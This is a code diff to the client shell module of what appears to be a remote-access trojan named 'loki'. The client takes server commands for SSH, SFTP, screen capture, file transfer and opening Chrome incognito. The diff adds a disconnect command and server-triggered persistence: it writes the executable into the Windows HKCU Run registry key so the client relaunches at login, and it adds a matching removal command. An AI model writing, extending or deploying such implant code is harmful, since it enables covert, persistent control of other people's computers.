@@ -2,11 +2,12 @@
 # Author: Pure-L0G1C
 # Description: Communicate with server
 
+import sys 
 import socket
 import subprocess
-from os import chdir
 from time import sleep
 from queue import Queue
+from os import chdir, path 
 from . import ssh, sftp, screen
 from threading import Thread, RLock 
 
@@ -14,6 +15,7 @@ class Shell(object):
 
  def __init__(self, sess_obj, services, home):
   self.recv_queue = Queue() 
+  self.disconnected = False
   self.services = services
   self.session = sess_obj
   self.is_alive = True 
@@ -27,7 +29,10 @@ class Shell(object):
                 3: self.download,
                 4: self.upload,   
                 5: self.screen,  
-                6: self.chrome,         
+                6: self.chrome, 
+                7: self.disconnect,  
+                8: self.create_task,   
+                9: self.remove_task,   
   }
 
  def listen_recv(self):
@@ -85,6 +90,11 @@ class Shell(object):
   print('Reconnecting ...')
   self.close()
 
+ def disconnect(self, args):
+  print('Disconnecting ...')
+  self.disconnected = True 
+  self.close()
+  
  def ssh_obj(self, args):
   if self.ssh:
    self.ssh.close()
@@ -122,3 +132,14 @@ class Shell(object):
   if '-1' in urls:return 
   cmd = 'start chrome -incognito {}'.format(' '.join(urls))
   subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+ def create_task(self, args):
+  if hasattr(sys, 'frozen'):
+   _path = path.basename(sys.executable)
+   cmd = r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v loki /f /d "{}"'.format(_path)
+   subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+ def remove_task(self, args):
+  if hasattr(sys, 'frozen'):
+   cmd = r'reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v loki /f'
+   subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
